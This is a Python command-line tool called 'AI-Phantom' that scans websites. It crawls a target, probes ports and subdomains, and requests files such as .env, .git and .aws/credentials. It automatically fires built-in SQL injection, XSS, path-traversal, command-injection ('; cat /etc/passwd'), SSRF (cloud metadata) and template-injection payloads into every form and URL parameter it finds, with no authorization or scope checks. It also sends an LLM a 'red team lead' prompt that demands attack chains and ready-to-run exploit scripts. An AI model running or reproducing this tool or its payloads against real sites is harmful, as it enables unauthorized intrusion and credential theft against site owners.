#!/usr/bin/env python3
import requests
import re
import json
import shlex
import signal
import sys
import threading
import time
import os
import socket
import ssl
import math
import urllib3
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

# Suppress insecure request warnings for a cleaner high-end UI
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional Playwright imports
try:
    import asyncio
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except Exception:
    PLAYWRIGHT_AVAILABLE = False

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.syntax import Syntax
from rich.prompt import Prompt
from rich.markdown import Markdown
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import FileHistory

# Global coordination
GLOBAL = {
    "playwright": None,
    "browser": None,
    "stopping": False,
    "max_workers": 20,
    "lock": threading.Lock()
}

console = Console()
scan_history = {} # Global telemetry store

# Config & Defaults
COMMON_DIRS = [
    "admin", "login", "dashboard", "config", "backup", "api", "v1", "uploads", "wp-admin", "wp-login", 
    "phpmyadmin", "assets", "dev", "staging", ".env", ".git", ".htaccess", ".git/config", 
    "composer.json", "package.json", "Dockerfile", "docker-compose.yml", "swagger.json", "openapi.yaml",
    ".aws/credentials", ".ssh", "id_rsa", "wp-config.php", "config.php"
]
SENSITIVE_KEYWORDS = [
    "password", "token", "api", "key", "secret", "config", "credential", "auth", "private", "aws_", 
    "db_password", "database_url", "redis_url", "s3_bucket", "firebase", "algolia_api", "slack_webhook",
    "access_token", "client_secret", "refresh_token", "id_rsa", "eyJ"
]
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 27017]
COMMON_SUBDOMAINS = ["www", "dev", "staging", "api", "test", "admin", "v1", "beta", "mail", "shop", "blog", "vpn", "portal"]
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AI-Phantom/3.5",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

CONFIG_FILE = os.path.expanduser("~/.aiwebscanner.json")

class UI:
    @staticmethod
    def banner():
        # High-End Professional "AI-Phantom" Stealth Banner
        # Uses standard rich formatting for maximum compatibility and speed
        console.print(r"""
[bold cyan]    ___    ____      ____  __  __ ___    _   __________  __  ___ [/bold cyan]
[bold cyan]   /   |  /  _/     / __ \/ / / /   |  / | / /_  __/ __ \/  |/  / [/bold cyan]
[bold blue]  / /| |  / /      / /_/ / /_/ / /| | /  |/ / / / / / / / /|_/ /  [/bold blue]
[bold blue] / ___ |_/ /      / ____/ __  / ___ |/ /|  / / / / /_/ / /  / /   [/bold blue]
[bold magenta]/_/  |_/___/     /_/   /_/ /_/_/  |_/_/ |_/ /_/  \____/_/  /_/    [/bold magenta]
[italic yellow]Developed by Gautham.A and Abhijith.S[/italic yellow]
[dim]____________________________________________________________________[/dim]
        """, justify="center")
        
        console.print(Panel.fit(
            "[bold white]PHANTOM NEURAL CORE v3.5[/bold white] | [bold green]STATUS: STEALTH[/bold green]\n"
            "[dim]Autonomous Security Auditing & Adversarial Reasoning[/dim]",
            border_style="bold blue",
            padding=(1, 4)
        ))

    @staticmethod
    def status(msg, style="bold green"):
        console.print(f"[{style}][*] {msg}[/{style}]")

    @staticmethod
    def error(msg):
        console.print(f"[bold red][!] {msg}[/bold red]")
    
    @staticmethod
    def section(title):
        console.rule(f"[bold blue]{title}[/bold blue]")

class Config:
    def __init__(self):
        self.load()
        self.api_key = os.getenv("GEMINI_API_KEY") or os.getenv("OPENAI_API_KEY") or self.api_key
        if os.getenv("GEMINI_API_KEY"): self.provider = "gemini"
        elif os.getenv("OPENAI_API_KEY"): self.provider = "openai"

    def load(self):
        self.api_key = None
        self.provider = "gemini"
        self.model = "gemini-1.5-flash"
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r") as f:
                    data = json.load(f)
                    self.api_key = data.get("api_key")
                    self.provider = data.get("provider", "gemini")
                    self.model = data.get("model", "gemini-1.5-flash")
            except: pass

    def save(self):
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump({"api_key": self.api_key, "provider": self.provider, "model": self.model}, f)
        except Exception as e: UI.error(f"Config save failed: {e}")

    def set_key(self, key, provider="gemini"):
        self.api_key = key
        self.provider = provider
        if provider == "gemini": self.model = "gemini-1.5-flash"
        elif provider == "openai": self.model = "gpt-4o"
        elif provider == "claude": self.model = "claude-3-5-sonnet-20240620"
        elif provider == "perplexity": self.model = "llama-3.1-sonar-large-128k-online"
        self.save()

config = Config()

class EntropyAnalyzer:
    @staticmethod
    def calculate(data):
        if not data: return 0
        entropy = 0
        for x in range(256):
            p_x = float(data.count(chr(x))) / len(data)
            if p_x > 0: entropy += - p_x * math.log(p_x, 2)
        return entropy

    @staticmethod
    def find_secrets(text):
        secrets = []
        words = re.findall(r'[a-zA-Z0-9+/=]{16,}', text)
        for word in words:
            if EntropyAnalyzer.calculate(word) > 3.8: secrets.append(word)
        return list(set(secrets))

class NeuralHeuristics:
    @staticmethod
    def predict_impact(vuln_type, detail):
        weights = {
            "Critical": ["secret", ".env", "password", "private_key", "aws_", "token", "eyJ"],
            "High": ["csrf", "insecure login", "lfi", "ssrf", "database", "sql"],
            "Medium": ["clickjacking", "csp", "hsts", "cors", "x-frame"],
            "Low": ["server header", "mime", "robots", "powered-by"]
        }
        detail_lower = str(detail).lower()
        for level, keywords in weights.items():
            if any(k in detail_lower or k in vuln_type.lower() for k in keywords): return level
        return "Medium"

class AIAnalyzer:
    @staticmethod
    def analyze_file(file_path, content):
        if not config.api_key:
            return "Error: No API Key configured. Run 'setup' to synchronize neural core."
        
        prompt = f"Audit this file for vulnerabilities and secrets:\nFile: {file_path}\nContent:\n{content}"
        return AIAnalyzer._call_api(prompt)

    @staticmethod
    def analyze(data):
        if not config.api_key:
            return "Error: No API Key configured. Run 'setup' to synchronize neural core."
        
        # V4.0 Advanced Cognitive Architecture Prompt
        prompt = f"""
        [SYSTEM IDENTITY: AI-PHANTOM RED TEAM LEAD]
        You are an elite, autonomous security research agent. 
        Operation Mode: Recursive Adversarial Reasoning.

        [INTELLIGENCE FEED: TARGET TELEMETRY]
        {json.dumps(data, indent=2, default=str)}

        [OBJECTIVE: MULTI-STAGE BREACH ANALYSIS]
        Perform a high-fidelity audit using the following logical layers:

        1. 🧠 ARCHITECTURAL DECONSTRUCTION:
           - Analyze the detected tech stack ({data.get('tech', 'Unknown')}).
           - Infer the internal network topology based on subdomains and open ports.
           - Identify the 'Crown Jewels' (Database, Auth Servers, Config files).

        2. 💀 ADVANCED ATTACK CHAINING:
           - Don't just list vulns. Connect them. 
           - Example: "If I use the LFI on [URL] to read the .env found in [DIR], I can then use those creds to access the MySQL port on [PORT]."
           - Hypothesize at least two high-impact breach scenarios.

        3. 🔍 EXPLOIT VERIFICATION SCRIPTS (PoCs):
           - For the top 2 findings, provide a ready-to-run Python or Bash one-liner script to verify the exploit.

        4. 🛡️ DEFENSIVE STRATEGY (CISO LEVEL):
           - Provide a prioritized remediation matrix.
           - Suggest architectural hardening (e.g., WAF rules, Network Segmentation).

        [OUTPUT REQUIREMENT]
        Use advanced security terminology. Format with bold Markdown headers. 
        Start with '### 🦾 ADVERSARIAL REASONING LOG'
        """
        return AIAnalyzer._call_api(prompt)

    @staticmethod
    def _call_api(prompt):
        with console.status(f"[bold magenta]Neural Core Thinking ({config.provider.upper()})...", spinner="aesthetic"):
            try:
                if config.provider == "gemini":
                    url = f"https://generativelanguage.googleapis.com/v1beta/models/{config.model}:generateContent?key={config.api_key}"
                    payload = {"contents": [{"parts": [{"text": prompt}]}]}
                    resp = requests.post(url, json=payload, timeout=60)
                    data = resp.json()
                    if "candidates" in data:
                        return data['candidates'][0]['content']['parts'][0]['text']
                    elif "error" in data:
                        return f"Gemini API Error: {data['error'].get('message', 'Unknown error')}"
                    else:
                        return f"Unexpected API Response: {data}"
                elif config.provider == "claude":
                    url = "https://api.anthropic.com/v1/messages"
                    headers = {
                        "x-api-key": config.api_key,
                        "anthropic-version": "2023-06-01",
                        "content-type": "application/json"
                    }
                    payload = {
                        "model": config.model,
                        "max_tokens": 4096,
                        "messages": [{"role": "user", "content": prompt}]
                    }
                    resp = requests.post(url, json=payload, headers=headers, timeout=60)
                    data = resp.json()
                    if "content" in data:
                        return data['content'][0]['text']
                    elif "error" in data:
                        return f"Claude API Error: {data['error'].get('message', 'Unknown error')}"
                    else:
                        return f"Unexpected API Response: {data}"
                else:
                    # OpenAI and Perplexity use the same structure
                    url = "https://api.openai.com/v1/chat/completions" if config.provider == "openai" else "https://api.perplexity.ai/chat/completions"
                    headers = {"Authorization": f"Bearer {config.api_key}", "Content-Type": "application/json"}
                    payload = {"model": config.model, "messages": [{"role": "user", "content": prompt}]}
                    resp = requests.post(url, json=payload, headers=headers, timeout=60)
                    data = resp.json()
                    if "choices" in data:
                        return data['choices'][0]['message']['content']
                    elif "error" in data:
                        return f"{config.provider.upper()} API Error: {data['error'].get('message', 'Unknown error')}"
                    else:
                        return f"Unexpected API Response: {data}"
            except Exception as e: return f"Neural Connectivity Error: {e}"

class KnowledgeBase:
    GUIDE = {
        "Header": "Security headers protect against common web attacks. Missing HSTS allows SSL stripping; missing CSP/XFO enables XSS and Clickjacking.",
        "Secret": "High-entropy strings often represent API keys, private tokens, or credentials. If leaked, they allow full unauthorized access to external services.",
        "CSRF": "Cross-Site Request Forgery allows an attacker to force a user to perform actions they didn't intend to, such as changing passwords or emails.",
        "CORS": "Insecure Cross-Origin Resource Sharing allows malicious websites to steal sensitive data from your site via the user's browser.",
        "SSRF": "Server-Side Request Forgery allows an attacker to force the server to make requests to internal resources, potentially leaking cloud metadata.",
        "LFI": "Local File Inclusion allows an attacker to read sensitive files on the server (e.g., /etc/passwd) by manipulating file paths.",
        "XSS": "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users, leading to session theft or site defacement.",
        "SQLi": "SQL Injection allows an attacker to interfere with the queries that an application makes to its database, potentially leaking or deleting data.",
        "Open Redirect": "Occurs when an application uses unvalidated input to redirect users, potentially leading them to phishing sites.",
        "Clickjacking": "A malicious technique of tricking a user into clicking on something different from what the user perceives."
    }

    @staticmethod
    def get_description(vuln_type):
        return KnowledgeBase.GUIDE.get(vuln_type, "Detailed analysis required to determine exact risk profile.")

class PoCGenerator:
    @staticmethod
    def generate(vuln_type, detail, url):
        vuln_type = vuln_type.lower()
        detail = str(detail).lower()
        
        if "hsts" in detail:
            return f"curl -I -s {url} | grep -i 'Strict-Transport-Security'"
        if "x-frame" in detail or "clickjacking" in detail:
            return f"<iframe src='{url}'></iframe>"
        if "csp" in detail:
            return f"curl -I -s {url} | grep -i 'Content-Security-Policy'"
        if "secret" in vuln_type or "entropy" in detail:
            return "Manual check: Verify if the string is an active API key/Token."
        if "cors" in detail:
            return f"curl -I -X OPTIONS {url} -H 'Origin: https://evil.com'"
        if "ssrf" in detail or "lfi" in detail:
            return f"{url}?url=http://169.254.169.254/latest/meta-data/"
        if "csrf" in detail:
            return "HTML: Create a cross-site form pointing to the target action."
        
        return "N/A"

class PayloadVault:
    XSS = [
        r"<script>alert(1)</script>", r"<img src=x onerror=alert(1)>", 
        r"'\"><script>confirm(1)</script>", r"<svg/onload=alert(1)>",
        r"\"-alert(1)-\"", r"<details/open/ontoggle=alert(1)>",
        r"<marquee/onstart=alert(1)>", r"<body/onload=alert(1)>"
    ]
    SQLI = [
        "'", "\"", "admin' --", "' OR 1=1--", "' OR '1'='1", "') OR ('1'='1", 
        "'; WAITFOR DELAY '0:0:5'--", "') OR SLEEP(5)#", "\") OR SLEEP(5)#",
        "1' ORDER BY 1--", "1' UNION SELECT NULL--"
    ]
    LFI = [
        "../../../../etc/passwd", "/etc/passwd", "..%2f..%2f..%2fetc/passwd",
        "../../../../windows/win.ini", "../../../../etc/hosts", 
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ", "/etc/issue"
    ]
    RCE = [
        "; id", "| whoami", "$(id)", "|| ping -c 1 127.0.0.1",
        "; curl http://127.0.0.1", "; cat /etc/passwd"
    ]
    SSRF = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80", "http://localhost:22",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1.json" # DigitalOcean
    ]
    SSTI = [
        "${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{config.items()}}", "{{self._TemplateReference__context}}"
    ]

class ActiveScanner:
    @staticmethod
    def test_all_vectors(url, html, session):
        found = []
        soup = BeautifulSoup(html, "html.parser")
        
        # Vector 1: URL Parameters
        parsed = urlparse(url)
        if parsed.query:
            found.extend(ActiveScanner.test_params(url, session))
        
        # Vector 2: Form Inputs
        forms = soup.find_all("form")
        for f in forms:
            action = urljoin(url, f.get("action", ""))
            method = f.get("method", "GET").upper()
            inputs = [i.get("name") for i in f.find_all("input") if i.get("name")]
            if inputs:
                found.extend(ActiveScanner.fuzz_form(action, method, inputs, session))
        return found

    @staticmethod
    def fuzz_form(action, method, inputs, session):
        found = []
        target_input = inputs[0]
        # Categories to test
        categories = {
            "SQL Injection": PayloadVault.SQLI,
            "Cross-Site Scripting": PayloadVault.XSS,
            "Template Injection": PayloadVault.SSTI,
            "Command Injection": PayloadVault.RCE,
            "SSRF": PayloadVault.SSRF
        }
        
        for name, payloads in categories.items():
            for p in payloads:
                try:
                    data = {target_input: p}
                    if method == "POST":
                        r = session.post(action, data=data, timeout=5, verify=False)
                    else:
                        r = session.get(action, params=data, timeout=5, verify=False)
                    
                    if p in r.text or AttackEngine.check_sqli(r.text) or any(x in r.text for x in ["root:x:0:0", "uid=", "instance-id"]):
                        found.append({
                            "name": f"Form-Based {name}", 
                            "detail": f"Input '{target_input}' reflects/triggers {name}",
                            "payload": p
                        })
                        break # Break payload loop for this category
                except: pass
        return found

    @staticmethod
    def test_params(url, session):
        found = []
        parsed = urlparse(url)
        params = parsed.query.split('&')
        categories = {
            "SQLi": PayloadVault.SQLI,
            "XSS": PayloadVault.XSS,
            "LFI": PayloadVault.LFI,
            "RCE": PayloadVault.RCE,
            "SSRF": PayloadVault.SSRF,
            "SSTI": PayloadVault.SSTI
        }

        for i in range(len(params)):
            if '=' in params[i]:
                k, v = params[i].split('=', 1)
                for name, payloads in categories.items():
                    for p in payloads:
                        try:
                            test_params = params.copy()
                            test_params[i] = f"{k}={p}"
                            target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(test_params)}"
                            r = session.get(target, timeout=5, verify=False)
                            if p in r.text or AttackEngine.check_sqli(r.text) or any(x in r.text for x in ["root:x:0:0", "uid=", "instance-id"]):
                                found.append({
                                    "name": f"Parameter {name}", 
                                    "detail": f"Param '{k}' is vulnerable",
                                    "payload": p
                                })
                                break # Move to next category
                        except: pass
        return found

class AttackEngine:
    @staticmethod
    def check_cloud_leaks(url):
        # Detect S3, Firebase, Azure storage patterns in source code
        patterns = {
            "S3 Bucket": r'[a-z0-9.-]+\.s3\.amazonaws\.com',
            "Firebase DB": r'[a-z0-9.-]+\.firebaseio\.com',
            "Azure Blob": r'[a-z0-9.-]+\.blob\.core\.windows\.net'
        }
        found = []
        for name, p in patterns.items():
            matches = re.findall(p, url.lower())
            if matches: found.append(f"Exposed {name}: {matches[0]}")
        return found

    @staticmethod
    def check_takeover(domain):
        # Heuristics for Subdomain Takeover
        providers = {
            "GitHub Pages": "There isn't a GitHub Pages site here",
            "Heroku": "no such app",
            "Amazon S3": "The specified bucket does not exist",
            "Zendesk": "Help Center Closed"
        }
        try:
            r = requests.get(f"https://{domain}", timeout=5, verify=False)
            for name, sig in providers.items():
                if sig in r.text: return f"Potential {name} Takeover detected!"
        except: pass
        return None

    @staticmethod
    def check_sqli(text):
        # Modern SQLi Error Signatures
        errors = [
            "SQL syntax", "mysql_fetch", "PostgreSQL query failed", 
            "ORA-00933", "MongoDB.Driver.MongoQueryException",
            "SQLite/JDBCDriver", "Dynamic SQL Error"
        ]
        found = [e for e in errors if e.lower() in text.lower()]
        return found

def audit_security_headers(headers):
    h = {k.lower(): v for k, v in headers.items()}
    issues = []
    if "content-security-policy" not in h: issues.append("Missing CSP")
    if "x-frame-options" not in h: issues.append("Missing X-Frame-Options")
    if "strict-transport-security" not in h: issues.append("Missing HSTS")
    cookies = headers.get("Set-Cookie", "")
    if cookies and "httponly" not in cookies.lower(): issues.append("Cookie missing HttpOnly")
    return issues

def extract_info(url, html):
    soup = BeautifulSoup(html or "", "html.parser")
    links = [urljoin(url, a["href"]) for a in soup.find_all("a", href=True)]
    forms = []
    for f in soup.find_all("form"):
        forms.append({
            "action": urljoin(url, f.get("action", "")),
            "method": f.get("method", "GET").upper(),
            "csrf": any("csrf" in str(i).lower() for i in f.find_all("input"))
        })
    return {"links": list(set(links)), "forms": forms, "title": soup.title.string if soup.title else "No Title"}

def detect_tech(html, headers):
    tech = []
    h_str = str(headers).lower()
    html_low = html.lower()
    if "wp-content" in html_low: tech.append("WordPress")
    if "react" in html_low or "_next" in html_low: tech.append("React/Next.js")
    if "php" in h_str or ".php" in html_low: tech.append("PHP")
    if "nginx" in h_str: tech.append("Nginx")
    if "apache" in h_str: tech.append("Apache")
    if "cloudflare" in h_str: tech.append("Cloudflare")
    return list(set(tech))

def crawl(target, max_depth=1):
    visited = set()
    queue = deque([(target, 0)])
    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    
    data = scan_history[target]
    data["pages"] = {}
    data["vulns"] = []
    data["tech"] = []

    with ThreadPoolExecutor(max_workers=GLOBAL["max_workers"]) as executor:
        while queue and not GLOBAL["stopping"]:
            batch = []
            while queue and len(batch) < GLOBAL["max_workers"]:
                url, depth = queue.popleft()
                if url in visited or depth > max_depth: continue
                visited.add(url)
                batch.append((url, depth))
            
            futures = {executor.submit(session.get, u, timeout=10, verify=False): (u, d) for u, d in batch}
            for future in as_completed(futures):
                u, d = futures[future]
                try:
                    r = future.result()
                    console.print(f"[dim]  Analyzing: {u} ({r.status_code})[/dim]")
                    if not r or r.status_code >= 400: continue
                    
                    if u == target: # Target site profile
                        data["tech"] = detect_tech(r.text, r.headers)
                    
                    info = extract_info(r.url, r.text)
                    header_issues = audit_security_headers(r.headers)
                    secrets = EntropyAnalyzer.find_secrets(r.text)
                    
                    # New: Full Spectrum Active Fuzzing (Forms + Params)
                    active_findings = ActiveScanner.test_all_vectors(r.url, r.text, session)
                    
                    with GLOBAL["lock"]:
                        data["pages"][r.url] = {
                            "status": r.status_code, 
                            "issues": header_issues, 
                            "secrets_found": secrets[:10],
                            "active_exploits": active_findings,
                            "tech": detect_tech(r.text, r.headers)
                        }
                        
                        seen_vulns = {f"{v['url']}|{v['name']}|{v['detail']}" for v in data["vulns"]}

                        for find in active_findings:
                            vuln_key = f"{r.url}|{find['name']}|{find['detail']}|{find.get('payload','')}"
                            if vuln_key not in seen_vulns:
                                data["vulns"].append({
                                    "url": r.url,
                                    "name": find["name"],
                                    "type": "Confirmed Exploit",
                                    "detail": find["detail"],
                                    "payload": find.get("payload", "N/A"),
                                    "impact": "Critical",
                                    "poc": f"Exploited via AI-Phantom Fuzzer"
                                })
                                seen_vulns.add(vuln_key)

                        for issue in header_issues:
                            impact = NeuralHeuristics.predict_impact("Header", issue)
                            name = "Security Header Missing"
                            vuln_key = f"{r.url}|{name}|{issue}"
                            if vuln_key not in seen_vulns:
                                data["vulns"].append({
                                    "url": r.url, 
                                    "name": name,
                                    "type": "Configuration", 
                                    "detail": f"Insecure: {issue}", 
                                    "impact": impact,
                                    "poc": PoCGenerator.generate("Header", issue, r.url)
                                })
                                seen_vulns.add(vuln_key)
                        
                        if secrets:
                            name = "Information Disclosure"
                            for s in secrets[:5]:
                                detail = f"Entropy Match: {s[:20]}..."
                                vuln_key = f"{r.url}|{name}|{detail}"
                                if vuln_key not in seen_vulns:
                                    data["vulns"].append({
                                        "url": r.url, 
                                        "name": name,
                                        "type": "Secret", 
                                        "detail": detail, 
                                        "impact": "Critical",
                                        "poc": f"Verify: {s}"
                                    })
                                    seen_vulns.add(vuln_key)
                    
                    if d < max_depth:
                        domain = urlparse(target).netloc
                        for link in info["links"]:
                            if urlparse(link).netloc == domain: queue.append((link, d + 1))
                except: pass

def run_scan(target):
    if not target.startswith("http"): target = "https://" + target
    target = target.rstrip("/")
    
    UI.section(f"AI-Phantom Scanning: {target}")
    parsed = urlparse(target)
    netloc = parsed.netloc
    hostname = netloc.split(':')[0] if ':' in netloc else netloc
    
    scan_history[target] = {"start_url": target, "subdomains": [], "open_ports": [], "pages": {}, "vulns": [], "dirs": []}
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        task_recon = progress.add_task("[cyan]Reconnaissance...", total=None)
        
        # Subdomains (using clean hostname)
        for sub in COMMON_SUBDOMAINS[:15]:
            try:
                host = f"{sub}.{hostname}"
                socket.gethostbyname(host)
                scan_history[target]["subdomains"].append(host)
            except: pass
        
        # Ports
        scan_ports_list = [80, 443, 8080, 3306]
        if ':' in netloc: # Respect the port if provided in target
            try: scan_ports_list.append(int(netloc.split(':')[1]))
            except: pass
            
        for port in list(set(scan_ports_list)):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((hostname, port)) == 0: scan_history[target]["open_ports"].append(port)
            except: pass
        
        crawl(target, max_depth=2)
        
        # Dirs
        for d in ["admin", ".env", ".git"]:
            try:
                r = requests.get(urljoin(target + "/", d), timeout=3, verify=False)
                if r.status_code < 400: scan_history[target]["dirs"].append(d)
            except: pass
            
    UI.status(f"Scan Finished. Found {len(scan_history[target]['pages'])} pages and {len(scan_history[target]['vulns'])} vulnerabilities.", "bold blue")

def show_help():
    table = Table(title="AI-Phantom Security Suite - Command Matrix", border_style="bold magenta")
    table.add_column("Command", style="bold yellow")
    table.add_column("Target", style="cyan")
    table.add_column("Description", style="white")
    table.add_row("scan <url/ip>", "Network/Web", "Deep recon, port scan, and web audit")
    table.add_row("scan file <path>", "Local File", "AI-powered SAST / Static Code Analysis")
    table.add_row("ai", "Last Scan", "Generate comprehensive AI security report")
    table.add_row("report", "Statistics", "View real-time finding dashboard")
    table.add_row("setup", "System", "Interactive API and system configuration")
    table.add_row("export <file>", "Data", "Export all telemetry to JSON")
    table.add_row("exit", "System", "Terminate neural link")
    console.print(table)

def main():
    UI.banner()
    last_target = None
    completer = WordCompleter(['scan', 'ai', 'report', 'setup', 'help', 'exit', 'export'])
    history = FileHistory(os.path.expanduser("~/.aiwebscanner_history"))
    
    while True:
        try:
            line = prompt("ai-phantom> ", completer=completer, history=history).strip()
            if not line: continue
            parts = shlex.split(line)
            cmd = parts[0].lower()
            
            if cmd == "exit": break
            elif cmd == "help": show_help()
            elif cmd == "setup":
                provider = Prompt.ask("Provider", choices=["gemini", "openai", "claude", "perplexity"], default="gemini")
                key = Prompt.ask("API Key", password=True)
                config.set_key(key, provider)
                UI.status(f"System core synchronized with {provider.upper()}. Access verified.", "bold green")
            elif cmd == "scan" and len(parts) > 1:
                if parts[1] == "file":
                    if len(parts) > 2:
                        path = parts[2]
                        if os.path.exists(path):
                            with open(path, "r", errors="ignore") as f: content = f.read()
                            UI.status(f"Ingesting {path}...")
                            report = AIAnalyzer.analyze_file(path, content)
                            console.print(Markdown(report))
                        else: UI.error(f"File not found: {path}")
                    else: UI.error("Usage: scan file <path>")
                else:
                    last_target = parts[1]
                    if not last_target.startswith("http"): last_target = "https://" + last_target
                    last_target = last_target.rstrip("/")
                    run_scan(last_target)
            elif cmd == "report":
                if not last_target or last_target not in scan_history:
                    UI.error("No scan data found. Run a scan first.")
                    continue
                data = scan_history[last_target]
                t = Table(title=f"AI-Phantom Intelligence: {last_target}", border_style="cyan")
                t.add_column("Metric", style="bold yellow"); t.add_column("Value", style="green")
                t.add_row("Subdomains", str(len(data["subdomains"])))
                t.add_row("Open Ports", str(data["open_ports"]))
                t.add_row("Mapped Pages", str(len(data["pages"])))
                t.add_row("Exposed Paths", str(data["dirs"]))
                console.print(t)
                
                if data["vulns"]:
                    vt = Table(title="AI-Phantom Unique Vulnerability Matrix", border_style="bold red")
                    vt.add_column("Impact", style="bold")
                    vt.add_column("Attack Name", style="bold cyan")
                    vt.add_column("Instances", style="white")
                    vt.add_column("Exact Payload Used", style="bold magenta")
                    vt.add_column("Sample Target Path", style="blue")
                    vt.add_column("Detail", style="yellow")
                    
                    # High-Precision Deduplication & Grouping Logic
                    # Keyed by (Attack Name + Detail + Payload) to group across URLs
                    grouped_vulns = {}
                    for v in data["vulns"]:
                        group_key = f"{v['name']}|{v['detail']}|{v.get('payload', '')}"
                        if group_key not in grouped_vulns:
                            grouped_vulns[group_key] = {
                                "impact": v["impact"],
                                "name": v["name"],
                                "payload": v.get("payload", "N/A"),
                                "url": v["url"],
                                "detail": v["detail"],
                                "count": 1
                            }
                        else:
                            grouped_vulns[group_key]["count"] += 1

                    impact_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
                    sorted_vulns = sorted(grouped_vulns.values(), key=lambda x: impact_order.get(x["impact"], 2))
                    
                    for v in sorted_vulns:
                        impact = v["impact"]
                        color = "red" if impact in ["Critical", "High"] else "yellow"
                        vt.add_row(
                            f"[{color}]{impact}[/{color}]", 
                            v["name"],
                            str(v["count"]),
                            v["payload"],
                            v["url"],
                            v["detail"]
                        )
                    console.print(vt)
                    
                    # AI-Phantom Knowledge Base: Risk Descriptions
                    UI.section("AI-Phantom Knowledge Base: Risk Descriptions")
                    guide_table = Table(box=None, show_header=False)
                    guide_table.add_column("Type", style="bold yellow", width=15)
                    guide_table.add_column("Description", style="italic white")
                    
                    seen_types = set(v["type"] for v in data["vulns"])
                    for v_type in seen_types:
                        guide_table.add_row(v_type, KnowledgeBase.get_description(v_type))
                    console.print(guide_table)
            elif cmd == "ai":
                if not last_target or last_target not in scan_history: UI.error("No scan data.")
                else: 
                    report = AIAnalyzer.analyze(scan_history[last_target])
                    console.print(Markdown(report))
            elif cmd == "export" and len(parts) > 1:
                if not last_target or last_target not in scan_history: UI.error("No data.")
                else:
                    with open(parts[1], "w") as f: json.dump(scan_history[last_target], f, indent=2)
                    UI.status(f"Exported to {parts[1]}")
        except KeyboardInterrupt: continue
        except EOFError: break
        except Exception as e: UI.error(f"Error: {e}")

if __name__ == "__main__": main()
